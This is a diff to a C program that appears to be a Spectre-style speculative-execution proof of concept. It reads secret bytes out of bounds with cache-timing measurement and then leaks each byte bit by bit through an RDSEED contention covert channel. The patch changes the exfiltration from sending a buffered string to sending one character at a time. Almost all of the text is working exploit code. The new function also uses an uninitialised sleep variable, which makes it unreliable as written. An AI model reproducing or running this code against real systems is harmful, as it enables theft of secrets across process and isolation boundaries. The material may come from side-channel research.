@@ -37,7 +37,7 @@ Analysis code
 #define CACHE_HIT_THRESHOLD (80) /* cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
+void readMemoryByte(size_t malicious_x, uint8_t value[2]) {
     static int results[256];
     int tries, i, j, k, mix_i, junk = 0;
     size_t training_x, x;
@@ -105,48 +105,44 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     /* use junk to prevent code from being optimized out */
     results[0] ^= junk;
     value[0] = (uint8_t) j;
-    score[0] = results[j];
-    value[1] = (uint8_t) k;
-    score[1] = results[k];
 }
 
-void rng_send(char * msg) {
-    // send the data contained in the array 'msg' through the rng conditioner
+void rng_send_char(char ltr) {
+    // send the character contained in 'ltr' through the rng conditioner
 
-    int len = strnlen(msg, 255); // find out the length of our message
-    int i, j, k, ret;            // temporary data
+    int i, j, ret;               // temporary data
     int x;                       // used to serialize our bytes
     unsigned long long p;        // placeholder for rdseed data
     struct timespec tp;          // time struct for synchronization
 
-    for (i = 0; i < len; i++) {
-        x = 0x80;                // set it to 128d (8th bit)
-        for (j = 0; j < 8; j++) {
-            // do the rdseed or don't
-            while (0 < 1) {
-                // do something every 2 seconds - we could speed it up later
-                clock_gettime(CLOCK_REALTIME, &tp);
-                if (tp.tv_sec % 2 == 0) {
-                    if (((msg[i] & x) >> (7 - j)) == 1) {
-                        printf("1");
-                        for (k = 0; k < 100000; k++) {
-                            ret = _rdseed64_step(&p);
-                        }
-                        sleep(1);
-                        break;
+    long sleeptime, seedtime = 0;
+
+    x = 0x80;                // set it to 128d (8th bit)
+    for (i = 0; i < 8; i++) {
+        // do the rdseed or don't
+        while (0 < 1) {
+            // do something every 2 seconds - we could speed it up later
+            clock_gettime(CLOCK_REALTIME, &tp);
+            if (tp.tv_nsec % 200000 <= 9) {
+                if (((ltr & x) >> (7 - i)) == 1) {
+                    printf("1");
+                    for (j = 0; j < 100; j++) {
+                        ret = _rdseed64_step(&p);
                     }
-                    else {
-                        printf("0");
-                        sleep(1);
-                        break;
-                    }
+                    usleep(sleeptime);
+                    break;
+                }
+                else {
+                    printf("0");
+                    usleep(sleeptime - seedtime);
+                    break;
                 }
             }
-            // move on to the next bit
-            x /= 2;
         }
-        printf("\n");
+        // move on to the next bit
+        x /= 2;
     }
+    printf("\n");
 }
 
 int main(int argc, const char ** argv) {
@@ -157,7 +153,7 @@ int main(int argc, const char ** argv) {
     size_t malicious_x =
         (size_t) (secret - (char *) array1); /* default for malicious_x */
     long unsigned int i;
-    int score[2], len = 40;
+    int len = 40;
     uint8_t value[2];
 
     for (i = 0; i < sizeof(array2); i++) {
@@ -169,17 +165,14 @@ int main(int argc, const char ** argv) {
         sscanf(argv[1], "%d", &len);
     }
 
-    char possible_secret[41] = {0};
     printf("Reading %d bytes:\n", len);
     while (--len >= 0) {
         /* This is primarily where we produced the function's description */
-        readMemoryByte(malicious_x++, value, score);
-        possible_secret[39-len] = value[0];
+        readMemoryByte(malicious_x++, value);
+        rng_send_char(value[0]);
     }
 
     // print out the data we're sending and then send it
-    printf("%s\n", possible_secret);
-    rng_send(possible_secret);
     return(0);
 }
 
